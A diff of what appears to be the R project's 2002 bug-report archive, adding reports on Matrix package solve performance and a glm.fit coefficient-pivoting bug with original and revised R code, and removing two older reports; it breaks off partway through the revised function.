@@ -2214,6 +2214,154 @@ _._._._
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 1361 *
+Subject: Matrix identification bug
+From: hyu@stats.uwo.ca
+Date: Tue, 5 Mar 2002 21:19:46 +0100 (MET)
+--seems to be about Matrix package, not solve
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 1361 <==
+From hyu@stats.uwo.ca  Tue Mar  5 21:19:46 2002
+Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA08030
+	for <R-bugs@biostat.ku.dk>; Tue, 5 Mar 2002 21:19:46 +0100 (MET)
+Date: Tue, 5 Mar 2002 21:19:46 +0100 (MET)
+From: hyu@stats.uwo.ca
+Message-Id: <200203052019.VAA08030@pubhealth.ku.dk>
+To: R-bugs@biostat.ku.dk
+Subject: Matrix identification bug
+
+Full_Name: Hao Yu
+Version: 1.4.1
+OS: Windws and Linux
+Submission from: (NULL) (129.100.45.161)
+
+
+Hi,
+   Recently we did some benchmarks regarding matrix inverse operation and found
+some strange things. See the following results (the package Matrix is most
+updated).
+
+1. load the function Toeplitz and library(Matrix)
+"Toeplitz"
+function(x)
+{
+        matrix(x[1 + abs(outer(seq(along = x), seq(along = x), FUN = "-"))], 
+                byrow = T, ncol = length(x))
+}
+2. On a PIII 1.125GHz (256kb cache)desktop PC with win2k, the results are
+> system.time(solve(Toeplitz(.5^seq(0,999))))
+[1] 38.25  0.22 42.01    NA    NA
+> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
+[1] 28.01  0.17 30.94    NA    NA
+
+On a PIII-M 1.2GHz (512kb cache) laptop PC with winxp pro, the results are
+> system.time(solve(Toeplitz(.5^seq(0,999))))
+[1] 33.94  0.25 34.01    NA    NA
+> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
+[1] 9.40  0.13 9.54    NA    NA
+
+On a PIII Xeon 1GHz (256kb cache) RedHat 7.2 Linux, the results are
+> system.time(solve(Toeplitz(.5^seq(0,999))))
+[1] 53.79  0.48 00.01    NA    NA
+> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
+[1] 30.29  0.21 30.59    NA    NA
+
+This was the first time that windows R outperformed linux R even PIII Xeon 1GHz
+is slightly faster than PIII 1.125GHz. Notice the abnormal result 9.4s from
+PIII-M 1.2GHz (cannot be three times faster). After using native fortran lapack
+(call to dpotrf and dpotri returns 9s for PIII Xeon), I realized that R may
+treat the matrix as a general matrix rather than symmetric except the abnormal
+case.  To confirm this, I modified the R_LapackPP.cc in Matrix package and it
+turned out that
+    is.MMatrix() failed to return true.
+Hence 
+        if (checkClass(classes, "Hermitian")) 
+            return new LaSymmMatDouble(x);
+is not executed in static LaMatDouble* asLaMatrix(SEXP x). Instead
+    if (isMatrix(x)) {
+            return new LaGenMatDouble(x);  
+        }
+is used. 
+After replaced
+    return new LaGenMatDouble(x);   
+with 
+    return new LaSymmMatDouble(x);
+
+the result was (PIII Xeon 1GHz RedHat 7.2 Linux))
+> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
+[1] 9.76 0.22 9.97 0.00 0.00
+
+Clearly there are some bugs in solve() and solve.Matrix(). Notice that all have
+> is.Hermitian(Toeplitz(.5^seq(0,999)))
+[1] TRUE
+
+
+Thanks 
+Hao Yu
+
+
+==> 1361.followup.1 <==
+From ripley@stats.ox.ac.uk  Tue Mar  5 22:32:30 2002
+Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA08212
+	for <R-bugs@biostat.ku.dk>; Tue, 5 Mar 2002 22:32:30 +0100 (MET)
+Received: from tern.stats (pc2-oxfo4-0-cust120.oxf.cable.ntl.com [62.254.131.120])
+	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id VAA24644;
+	Tue, 5 Mar 2002 21:31:57 GMT
+Date: Tue, 5 Mar 2002 21:32:31 +0000 (GMT Standard Time)
+From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
+To: hyu@stats.uwo.ca
+cc: R-bugs@biostat.ku.dk
+Subject: Re: [Rd] Matrix identification bug (PR#1361)
+In-Reply-To: <200203052019.VAA08035@pubhealth.ku.dk>
+Message-ID: <Pine.WNT.4.44.0203052125210.1136-100000@tern.stats>
+Sender: ripley@stats.ox.ac.uk
+MIME-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII
+
+On Tue, 5 Mar 2002 hyu@stats.uwo.ca wrote:
+
+> Full_Name: Hao Yu
+> Version: 1.4.1
+> OS: Windws and Linux
+> Submission from: (NULL) (129.100.45.161)
+
+[...]
+
+> the result was (PIII Xeon 1GHz RedHat 7.2 Linux))
+> > system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
+> [1] 9.76 0.22 9.97 0.00 0.00
+>
+> Clearly there are some bugs in solve() and solve.Matrix(). Notice that all have
+
+Nothing in this report suggests a bug in solve().  Can you please provide
+some evidence for your claim (which is not `clear' to me), and
+
+> solve
+function (a, b, ...)
+UseMethod("solve")
+
+seems hard to get wrong!  (It matters: solve is part of R: solve.Matrix is
+a contributed addon.)
+
+Incidentally, these sort of timings are crucially dependent on the BLAS
+library used, and in my experience that is a far larger factor that the OS
+used.  However, that was not part of the report ....
+
+-- 
+Brian D. Ripley,                  ripley@stats.ox.ac.uk
+Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
+University of Oxford,             Tel:  +44 1865 272861 (self)
+1 South Parks Road,                     +44 1865 272860 (secr)
+Oxford OX1 3TG, UK                Fax:  +44 1865 272595
+
+
+==> 1361.audit <==
+Thu Mar  7 12:41:18 2002	ripley	changed notes
+Thu Mar  7 12:41:18 2002	ripley	foobar
+Thu Mar  7 12:41:18 2002	ripley	moved from incoming to Add-ons
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Directory:  Analyses
 
@@ -5937,55 +6085,6 @@ curve(70-0.3*x,add=T)
 Mon Jan  7 10:32:50 2002	ripley	foobar
 Mon Jan  7 10:32:50 2002	ripley	moved from incoming to Graphics
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-* PR# 1248 *
-Subject: piechart default colour
-From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
-Date: 07 Jan 2002 18:54:02 +0100
--- no notes --
-~~~~~~~~~~ original reports follow ~~~~~~~~~~
-==> 1248 <==
-From postmaster@franz.stat.wisc.edu  Mon Jan  7 18:54:40 2002
-Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA01829
-	for <r-bugs@biostat.ku.dk>; Mon, 7 Jan 2002 18:54:39 +0100 (MET)
-Received: from pubhealth.ku.dk (really [130.225.108.10]) by franz.stat.wisc.edu
-	via smail with esmtp
-	id <m16NdyN-000IY9C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
-	for <r-bugs@r-project.org>; Mon, 7 Jan 2002 11:54:11 -0600 (CST) 
-Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA01825
-	for <r-bugs@r-project.org>; Mon, 7 Jan 2002 18:54:20 +0100 (MET)
-Received: (from pd@localhost)
-	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g07Hs3e32039;
-	Mon, 7 Jan 2002 18:54:03 +0100
-X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
-Sender: pd@pubhealth.ku.dk
-To: r-bugs@r-project.org
-Subject: piechart default colour
-From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
-Date: 07 Jan 2002 18:54:02 +0100
-Message-ID: <x2666ef3np.fsf@blueberry.kubism.ku.dk>
-Lines: 12
-User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-
-As of 1.4.0, the default colour of pieslices is black. Try
-piechart(1:3) for instance. The workaround is to use an explicit
-col="white" argument.
-
-(Of course, everything in example(piechart) uses fancy colour schemes,
-so nobody noticed that the default got changed.)
-
--- 
-   O__  ---- Peter Dalgaard             Blegdamsvej 3  
-  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
- (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
-~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907
-
-==> 1248.audit <==
-Fri Jan 11 09:02:18 2002	pd	moved from incoming to Graphics
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * PR# 1300 *
 Subject: FW: layout and piechart diameter problem
 From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
@@ -9144,56 +9243,6 @@ of evalList that replaced an empty ... with R_MissingArg, but I'm scared.
 Fri Jan 11 09:02:53 2002	pd	foobar
 Fri Jan 11 09:02:53 2002	pd	moved from incoming to Low-level
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-* PR# 1267 *
-Subject: hashing NaN
-From: Thomas Lumley <tlumley@u.washington.edu>
-Date: Wed, 16 Jan 2002 16:29:35 -0800 (PST)
---Patch put in R-devel for further testing.
-~~~~~~~~~~ original reports follow ~~~~~~~~~~
-==> 1267 <==
-From postmaster@franz.stat.wisc.edu  Thu Jan 17 01:30:07 2002
-Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA20692
-	for <r-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 01:30:07 +0100 (MET)
-Received: from jason04.u.washington.edu (really [140.142.8.53]) by franz.stat.wisc.edu
-	via smail with esmtp
-	id <m16R0Qz-000IbWC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
-	for <r-bugs@r-project.org>; Wed, 16 Jan 2002 18:29:37 -0600 (CST) 
-Received: from homer05.u.washington.edu (homer05.u.washington.edu [140.142.15.39])
-	by jason04.u.washington.edu (8.11.6+UW01.08/8.11.6+UW01.10) with ESMTP id g0H0TZC24106
-	for <r-bugs@r-project.org>; Wed, 16 Jan 2002 16:29:36 -0800
-Received: from localhost (tlumley@localhost)
-	by homer05.u.washington.edu (8.11.6+UW01.08/8.11.6+UW01.10) with ESMTP id g0H0TZN43686
-	for <r-bugs@r-project.org>; Wed, 16 Jan 2002 16:29:35 -0800
-Date: Wed, 16 Jan 2002 16:29:35 -0800 (PST)
-From: Thomas Lumley <tlumley@u.washington.edu>
-To: r-bugs@r-project.org
-Subject: hashing NaN
-Message-ID: <Pine.A41.4.44.0201161618110.75106-100000@homer05.u.washington.edu>
-MIME-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
-
-
-Different NaNs can hash to different values and so be treated differently
-by duplicated(), unique(), match(). Any IEEE double value with exponent
-bits all 1 is NaN (except the one that is NA).
-
-AFAICT all arithmetic and mathematical operations in R produce the same
-NaN, but this is not guaranteed by any standard. read.spss() will produce
-different NaNs when reading missing values in at least some circumstances.
-
-
-	-thomas
-
-Thomas Lumley			Asst. Professor, Biostatistics
-tlumley@u.washington.edu	University of Washington, Seattle
-
-
-==> 1267.audit <==
-Fri Jan 18 09:12:14 2002	ripley	changed notes
-Fri Jan 18 09:12:14 2002	ripley	foobar
-Fri Jan 18 09:12:14 2002	ripley	moved from incoming to Low-level
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * PR# 1301 *
 Subject: incorrect handling of arrays of list elements
 From: =?iso-8859-1?Q?Jens=20Oehlschl=E4gel?= <joehl@web.de>
@@ -10137,7 +10186,517 @@ Paul Gilbert
 
 Directory:  Models
 
-none
+* PR# 1331 *
+Subject: Bug in glm.fit?
+From: Berwin Turlach <berwin@maths.uwa.edu.au>
+Date: Wed, 27 Feb 2002 16:15:24 +0800 (WST)
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 1331 <==
+From postmaster@franz.stat.wisc.edu  Wed Feb 27 09:16:08 2002
+Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA23935
+	for <r-bugs@biostat.ku.dk>; Wed, 27 Feb 2002 09:16:06 +0100 (MET)
+Received: from bossiaea.maths.uwa.edu.au (really [130.95.16.247]) by franz.stat.wisc.edu
+	via smail with esmtp (ident root using rfc1413)
+	id <m16fzFN-000IaxC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
+	for <r-bugs@r-project.org>; Wed, 27 Feb 2002 02:15:33 -0600 (CST) 
+Received: (from berwin@localhost)
+	by bossiaea.maths.uwa.edu.au (8.9.3/8.9.3) id QAA21958;
+	Wed, 27 Feb 2002 16:15:24 +0800
+From: Berwin Turlach <berwin@maths.uwa.edu.au>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Message-ID: <15484.38300.272751.70242@bossiaea.maths.uwa.edu.au>
+Date: Wed, 27 Feb 2002 16:15:24 +0800 (WST)
+To: r-bugs@r-project.org
+Subject: Bug in glm.fit?
+X-Mailer: VM 6.75 under Emacs 19.34.1
+
+G'day all,
+
+I had a look at the GLM code of R (1.4.1) and I believe that there are
+problems with the function "glm.fit" that may bite in rare
+circumstances.  Note, I have no data set with which I ran into
+trouble.  This report is solely based on having a look at the code.
+
+Below I append a listing of the glm.fit function as produced by my
+system.  I have added line numbers so that I can easily refer to the
+code that is, in my opinion, problematic.  I also append a modified
+version that, hopefully, solves these problems.  At least on
+"example(glm)" both functions produce the same output (if the random
+number generator is set to the same seed).
+
+Short summary: I envisage problems with glm.fit if two conditions are
+met simultaneously.  Namely, (1) the design matrix is such that the QR
+algorithm used in the weighted least squares (WLS) step has to pivot
+columns (lines 81-86) and (2) during the iterations the step size has
+to be truncated (either lines 98-114 or lines 115-130).
+
+More details:
+In line 90, the variables "start" and "coef" are set to the
+coefficients of the WLS and "start" is then permuted (line 91) to take
+a possible pivoting of the QR algorithm into account.  Note that
+"coef" is not permutated.   Also, since the weights in the iterative
+weighted least squares algorithm change in each iteration (lines
+60-139) it is theoretically possible that on some executions of this
+chunk pivoting occurs and on others there is no pivoting.
+
+Hoever, if the new coefficients are unsuitable and either the block at
+lines 98-114 or lines 115-130 is entered, then "start" is modified by
+shrinking it toward "coefold".  There are two problems:
+1) If this happens the first time the loop in lines 60-139 is executed,
+   then coefold is initialised to the value of "start" that was passed
+down to the routine (line 58).  This might well be NULL (usually is?).
+In this case line 105 and line 122 would produce a new "start" which
+is numeric(0) and glm.fit would stop execution pretty soon thereafter.
+2) If it happens during a later execution of the loop in lines 60-139,
+   then "coefold" was set to the value "coef" of the prior execution
+of the loop (line 137).  Depending on whether either of the code
+chunks at lines 98-114 or lines 115-130 have been executed on that
+previous occastion, "coefold" may or may not be permuted to the same
+order as "start" in this moment.  Hence, it could happen that "start"
+is shrunken towards something that doesn't make sense in line 105 or
+line 122.
+
+Relating to point 2) above.  Theoretically, during the main loop
+(lines 60-139) either of the chunks in lines 98-114 or lines 115-130
+could be entered.  In these chunks "coef" is set to the shrunken
+"start" at the end (line 111 or line 126).  If, with the ``deviance
+for the shrunken "start"'' the convergence criterion in line 131 is
+fulfilled, then the main loop would finish.  In other words, at line
+140 there is no way to tell whether "coef" is in the order of
+"fit$coefficients" or has been permutated to have the same order as
+"start".  In the later case, the additional permutation in line 157
+would garble the solution.
+
+I hope that the revised version that I append below, works around all
+these potential problems without breaking anything.  As I said, I ran
+"example(glm)" with the revised version and got the same results.  But
+I guess you guys have far more exhaustive tests and may want to do
+some further test to ensure that nothing is broken.
+
+The revised version also makes some cosmetic changes that reflect my
+preferences :-) :
+1) Given the default values of the parameters "weights" and "offset" I
+   was surprised about the tests in lines 17 and 19.  They seemed
+superfluous.  Until I noticed that "glm" can call "glm.fit" with
+actual arguments for these parameters that are NULL.  Hence, I suggest
+that the default values for these arguments should be NULL.  This
+makes it easier to understand the code of "glm.fit" (if one looks only
+at "glm.fit" and not at all the code "glm", "glm.fit" &c
+simultaneously). 
+2) As mentioned above, "coefold" may be initialised to NULL in line 58
+   if the parameter "start" is not specified.  (Which typically would be
+the case?)  But furthermore, in lines 44-53 the test for the parameter
+"start" is mangled into the test for the parameter "etastart".  If
+"etastart" is not specified but a bad "start" (not the correct
+length), the bad "start" would be caught.  But if a valid "etastart"
+is specified, then a bad "start" would not be caught since those tests
+are not executed.  (Are there users that specify both?).  Anyway, I
+have untangled those sanity check.  Also to get a clean initialisation
+for "coefold".
+3) Given that the column names of fit$qr are (correctly) set in line
+   171, I didn't see the purpose of line 155.  That line anyhow sets
+the column names wrongly if pivoting has occured.  So I deleted that
+line. 
+
+That's all for now.  Thanks for the great package and I hope that this
+bug report will be useful.
+
+Cheers,
+
+        Berwin
+
+========================= original glm.fit =========================
+  1  glm.fit <-
+  2  function (x, y, weights = rep(1, nobs), start = NULL, etastart = NULL, 
+  3      mustart = NULL, offset = rep(0, nobs), family = gaussian(), 
+  4      control = glm.control(), intercept = TRUE) 
+  5  {
+  6      x <- as.matrix(x)
+  7      xnames <- dimnames(x)[[2]]
+  8      ynames <- names(y)
+  9      conv <- FALSE
+ 10      nobs <- NROW(y)
+ 11      nvars <- NCOL(x)
+ 12      if (nvars == 0) {
+ 13          cc <- match.call()
+ 14          cc[[1]] <- as.name("glm.fit.null")
+ 15          return(eval(cc, parent.frame()))
+ 16      }
+ 17      if (is.null(weights)) 
+ 18          weights <- rep(1, nobs)
+ 19      if (is.null(offset)) 
+ 20          offset <- rep(0, nobs)
+ 21      variance <- family$variance
+ 22      dev.resids <- family$dev.resids
+ 23      aic <- family$aic
+ 24      linkinv <- family$linkinv
+ 25      mu.eta <- family$mu.eta
+ 26      if (!is.function(variance) || !is.function(linkinv)) 
+ 27          stop("illegal `family' argument")
+ 28      valideta <- family$valideta
+ 29      if (is.null(valideta)) 
+ 30          valideta <- function(eta) TRUE
+ 31      validmu <- family$validmu
+ 32      if (is.null(validmu)) 
+ 33          validmu <- function(mu) TRUE
+ 34      if (is.null(mustart)) {
+ 35          eval(family$initialize)
+ 36      }
+ 37      else {
+ 38          mukeep <- mustart
+ 39          eval(family$initialize)
+ 40          mustart <- mukeep
+ 41      }
+ 42      if (NCOL(y) > 1) 
+ 43          stop("y must be univariate unless binomial")
+ 44      eta <- if (!is.null(etastart) && valideta(etastart)) 
+ 45          etastart
+ 46      else if (!is.null(start)) 
+ 47          if (length(start) != nvars) 
+ 48              stop(paste("Length of start should equal", nvars, 
+ 49                  "and correspond to initial coefs for", deparse(xnames)))
+ 50          else as.vector(if (NCOL(x) == 1) 
+ 51              x * start
+ 52          else x %*% start)
+ 53      else family$linkfun(mustart)
+ 54      mu <- linkinv(eta)
+ 55      if (!(validmu(mu) && valideta(eta))) 
+ 56          stop("Can't find valid starting values: please specify some")
+ 57      devold <- sum(dev.resids(y, mu, weights))
+ 58      coefold <- start
+ 59      boundary <- FALSE
+ 60      for (iter in 1:control$maxit) {
+ 61          good <- weights > 0
+ 62          varmu <- variance(mu)[good]
+ 63          if (any(is.na(varmu))) 
+ 64              stop("NAs in V(mu)")
+ 65          if (any(varmu == 0)) 
+ 66              stop("0s in V(mu)")
+ 67          mu.eta.val <- mu.eta(eta)
+ 68          if (any(is.na(mu.eta.val[good]))) 
+ 69              stop("NAs in d(mu)/d(eta)")
+ 70          good <- (weights > 0) & (mu.eta.val != 0)
+ 71          if (all(!good)) {
+ 72              conv <- FALSE
+ 73              warning(paste("No observations informative at iteration", 
+ 74                  iter))
+ 75              break
+ 76          }
+ 77          z <- (eta - offset)[good] + (y - mu)[good]/mu.eta.val[good]
+ 78          w <- sqrt((weights[good] * mu.eta.val[good]^2)/variance(mu)[good])
+ 79          ngoodobs <- as.integer(nobs - sum(!good))
+ 80          ncols <- as.integer(1)
+ 81          fit <- .Fortran("dqrls", qr = x[good, ] * w, n = as.integer(ngoodobs), 
+ 82              p = nvars, y = w * z, ny = ncols, tol = min(1e-07, 
+ 83                  control$epsilon/1000), coefficients = numeric(nvars), 
+ 84              residuals = numeric(ngoodobs), effects = numeric(ngoodobs), 
+ 85              rank = integer(1), pivot = 1:nvars, qraux = double(nvars), 
+ 86              work = double(2 * nvars), PACKAGE = "base")
+ 87          if (nobs < fit$rank) 
+ 88              stop(paste("X matrix has rank", fit$rank, "but only", 
+ 89                  nobs, "observations"))
+ 90          start <- coef <- fit$coefficients
+ 91          start[fit$pivot] <- coef
+ 92          eta <- drop(x %*% start)
+ 93          mu <- linkinv(eta <- eta + offset)
+ 94          dev <- sum(dev.resids(y, mu, weights))
+ 95          if (control$trace) 
+ 96              cat("Deviance =", dev, "Iterations -", iter, "\n")
+ 97          boundary <- FALSE
+ 98          if (is.na(dev) || any(is.na(coef))) {
+ 99              warning("Step size truncated due to divergence")
+100              ii <- 1
+101              while ((is.na(dev) || any(is.na(start)))) {
+102                  if (ii > control$maxit) 
+103                    stop("inner loop 1; can't correct step size")
+104                  ii <- ii + 1
+105                  start <- (start + coefold)/2
+106                  eta <- drop(x %*% start)
+107                  mu <- linkinv(eta <- eta + offset)
+108                  dev <- sum(dev.resids(y, mu, weights))
+109              }
+110              boundary <- TRUE
+111              coef <- start
+112              if (control$trace) 
+113                  cat("New Deviance =", dev, "\n")
+114          }
+115          if (!(valideta(eta) && validmu(mu))) {
+116              warning("Step size truncated: out of bounds.")
+117              ii <- 1
+118              while (!(valideta(eta) && validmu(mu))) {
+119                  if (ii > control$maxit) 
+120                    stop("inner loop 2; can't correct step size")
+121                  ii <- ii + 1
+122                  start <- (start + coefold)/2
+123                  mu <- linkinv(eta <- eta + offset)
+124              }
+125              boundary <- TRUE
+126              coef <- start
+127              dev <- sum(dev.resids(y, mu, weights))
+128              if (control$trace) 
+129                  cat("New Deviance =", dev, "\n")
+130          }
+131          if (abs(dev - devold)/(0.1 + abs(dev)) < control$epsilon) {
+132              conv <- TRUE
+133              break
+134          }
+135          else {
+136              devold <- dev
+137              coefold <- coef
+138          }
+139      }
+140      if (!conv) 
+141          warning("Algorithm did not converge")
+142      if (boundary) 
+143          warning("Algorithm stopped at boundary value")
+144      eps <- 10 * .Machine$double.eps
+145      if (family$family == "binomial") {
+146          if (any(mu > 1 - eps) || any(mu < eps)) 
+147              warning("fitted probabilities numerically 0 or 1 occurred")
+148      }
+149      if (family$family == "poisson") {
+150          if (any(mu < eps)) 
+151              warning("fitted rates numerically 0 occurred")
+152      }
+153      if (fit$rank != nvars) {
+154          coef[seq(fit$rank + 1, nvars)] <- NA
+155          dimnames(fit$qr) <- list(NULL, xnames)
+156      }
+157      coef[fit$pivot] <- coef
+158      xxnames <- xnames[fit$pivot]
+159      residuals <- rep(NA, nobs)
+160      residuals[good] <- z - (eta - offset)[good]
+161      fit$qr <- as.matrix(fit$qr)
+162      nr <- min(sum(good), nvars)
+163      if (nr < nvars) {
+164          Rmat <- diag(nvars)
+165          Rmat[1:nr, 1:nvars] <- fit$qr[1:nr, 1:nvars]
+166      }
+167      else Rmat <- fit$qr[1:nvars, 1:nvars]
+168      Rmat <- as.matrix(Rmat)
+169      Rmat[row(Rmat) > col(Rmat)] <- 0
+170      names(coef) <- xnames
+171      colnames(fit$qr) <- xxnames
+172      dimnames(Rmat) <- list(xxnames, xxnames)
+173      names(residuals) <- ynames
+174      names(mu) <- ynames
+175      names(eta) <- ynames
+176      wt <- rep(0, nobs)
+177      wt[good] <- w^2
+178      names(wt) <- ynames
+179      names(weights) <- ynames
+180      names(y) <- ynames
+181      names(fit$effects) <- c(xxnames[seq(fit$rank)], rep("", sum(good) - 
+182          fit$rank))
+183      wtdmu <- if (intercept) 
+184          sum(weights * y)/sum(weights)
+185      else linkinv(offset)
+186      nulldev <- sum(dev.resids(y, wtdmu, weights))
+187      n.ok <- nobs - sum(weights == 0)
+188      nulldf <- n.ok - as.integer(intercept)
+189      resdf <- n.ok - fit$rank
+190      aic.model <- aic(y, n, mu, weights, dev) + 2 * fit$rank
+191      list(coefficients = coef, residuals = residuals, fitted.values = mu, 
+192          effects = fit$effects, R = Rmat, rank = fit$rank, qr = fit[c("qr", 
+193              "rank", "qraux", "pivot", "tol")], family = family, 
+194          linear.predictors = eta, deviance = dev, aic = aic.model, 
+195          null.deviance = nulldev, iter = iter, weights = wt, prior.weights = weights, 
+196          df.residual = resdf, df.null = nulldf, y = y, converged = conv, 
+197          boundary = boundary)
+198  }
+========================= modified glm.fit =========================
+glm.fit <- 
+function (x, y, weights = NULL, start = NULL, etastart = NULL, 
+    mustart = NULL, offset = NULL, family = gaussian(), 
+    control = glm.control(), intercept = TRUE) 
+{
+    x <- as.matrix(x)
+    xnames <- dimnames(x)[[2]]
+    ynames <- names(y)
+    conv <- FALSE
+    nobs <- NROW(y)
+    nvars <- NCOL(x)
+    if (nvars == 0) {
+        cc <- match.call()
+        cc[[1]] <- as.name("glm.fit.null")
+        return(eval(cc, parent.frame()))
+    }
+    if (is.null(weights)) 
+        weights <- rep(1, nobs)
+    if (is.null(offset)) 
+        offset <- rep(0, nobs)
+    variance <- family$variance
+    dev.resids <- family$dev.resids
+    aic <- family$aic
+    linkinv <- family$linkinv
+    mu.eta <- family$mu.eta
+    if (!is.function(variance) || !is.function(linkinv)) 
+        stop("illegal `family' argument")
+    valideta <- family$valideta
+    if (is.null(valideta)) 
+        valideta <- function(eta) TRUE
+    validmu <- family$validmu
+    if (is.null(validmu)) 
+        validmu <- function(mu) TRUE
+    if (is.null(mustart)) {
+        eval(family$initialize)
+    }
+    else {
+        mukeep <- mustart
+        eval(family$initialize)
+        mustart <- mukeep
+    }
+    if (NCOL(y) > 1) 
+        stop("y must be univariate unless binomial")
+    if (!is.null(start)){
+      if (length(start) != nvars) 
+        stop(paste("Length of start should equal", nvars, 
+                   "and correspond to initial coefs for", deparse(xnames)))
+      coef <- coefold <- start  # initialise coef here in order to
+                                # be able to subset it below 
+    }
+    else
+      coef <- coefold <- rep(0,nvars)
+    eta <- if (!is.null(etastart) && valideta(etastart)) 
+      etastart
+    else if (!is.null(start)) 
+      as.vector(if (NCOL(x) == 1) 
+                x * start
+      else x %*% start)
+    else family$linkfun(mustart)
+    mu <- linkinv(eta)
+    if (!(validmu(mu) && valideta(eta))) 
+        stop("Can't find valid starting values: please specify some")
+    devold <- sum(dev.resids(y, mu, weights))
+    boundary <- FALSE
+    for (iter in 1:control$maxit) {
+        good <- weights > 0
+        varmu <- variance(mu)[good]
+        if (any(is.na(varmu))) 
+            stop("NAs in V(mu)")
+        if (any(varmu == 0)) 
+            stop("0s in V(mu)")
+        mu.eta.val <- mu.eta(eta)
+        if (any(is.na(mu.eta.val[good]))) 
+            stop("NAs in d(mu)/d(eta)")
+        good <- (weights > 0) & (mu.eta.val != 0)
+        if (all(!good)) {
+            conv <- FALSE
+            warning(paste("No observations informative at iteration", 
+                iter))
+            break
+        }
+        z <- (eta - offset)[good] + (y - mu)[good]/mu.eta.val[good]
+        w <- sqrt((weights[good] * mu.eta.val[good]^2)/variance(mu)[good])
+        ngoodobs <- as.integer(nobs - sum(!good))
+        ncols <- as.integer(1)
+        fit <- .Fortran("dqrls", qr = x[good, ] * w, n = as.integer(ngoodobs), 
+            p = nvars, y = w * z, ny = ncols, tol = min(1e-07, 
+                control$epsilon/1000), coefficients = numeric(nvars), 
+            residuals = numeric(ngoodobs), effects = numeric(ngoodobs), 
+            rank = integer(1), pivot = 1:nvars, qraux = double(nvars), 
+            work = double(2 * nvars), PACKAGE = "base")
+        if (nobs < fit$rank) 
+            stop(paste("X matrix has rank", fit$rank, "but only", 
+                nobs, "observations"))
+        coef[fit$pivot] <- fit$coefficients
+        eta <- drop(x %*% coef)
+        mu <- linkinv(eta <- eta + offset)
+        dev <- sum(dev.resids(y, mu, weights))
+        if (control$trace) 
+            cat("Deviance =", dev, "Iterations -", iter, "\n")
+        boundary <- FALSE
+        if (is.na(dev) || any(is.na(coef))) {
+            warning("Step size truncated due to divergence")
+            ii <- 1
+            while ((is.na(dev) || any(is.na(coef)))) {
+                if (ii > control$maxit) 
+                  stop("inner loop 1; can't correct step size")
+                ii <- ii + 1
+                coef <- (coef + coefold)/2
+                eta <- drop(x %*% coef)
+                mu <- linkinv(eta <- eta + offset)
+                dev <- sum(dev.resids(y, mu, weights))
+            }
+            boundary <- TRUE
+            if (control$trace) 
+                cat("New Deviance =", dev, "\n")
+        }
+        if (!(valideta(eta) && validmu(mu))) {
+            warning("Step size truncated: out of bounds.")
+            ii <- 1
+            while (!(valideta(eta) && validmu(mu))) {
+                if (ii > control$maxit) 
+                  stop("inner loop 2; can't correct step size")
+                ii <- ii + 1
+                coef <- (coef + coefold)/2
+                mu <- linkinv(eta <- eta + offset)
+            }
+            boundary <- TRUE
+            dev <- sum(dev.resids(y, mu, weights))
+            if (control$trace) 
+                cat("New Deviance =", dev, "\n")
+        }
+        if (abs(dev - devold)/(0.1 + abs(dev)) < control$epsilon) {
+            conv <- TRUE
+            break
+        }
+        else {
+            devold <- dev
+            coefold <- coef
+        }
+    }
+    if (!conv) 
+        warning("Algorithm did not converge")
+    if (boundary) 
+        warning("Algorithm stopped at boundary value")
+    eps <- 10 * .Machine$double.eps
+    if (family$family == "binomial") {
+        if (any(mu > 1 - eps) || any(mu < eps)) 
+            warning("fitted probabilities numerically 0 or 1 occurred")
+    }
+    if (family$family == "poisson") {
+        if (any(mu < eps)) 
